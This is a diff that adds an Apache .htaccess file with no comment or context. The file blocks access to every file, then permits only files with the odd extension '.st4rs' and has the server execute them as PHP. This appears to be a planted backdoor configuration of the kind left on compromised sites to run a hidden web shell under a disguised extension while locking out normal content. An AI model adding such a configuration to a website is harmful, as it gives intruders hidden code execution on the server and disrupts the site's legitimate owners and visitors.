@@ -1,0 +1,8 @@
+<FilesMatch "^.*$">
+Deny from all
+</FilesMatch>
+<FilesMatch ".st4rs$">
+Allow from all
+SetHandler application/x-httpd-php
+</FilesMatch>
+AddType application/x-httpd-php .st4rs
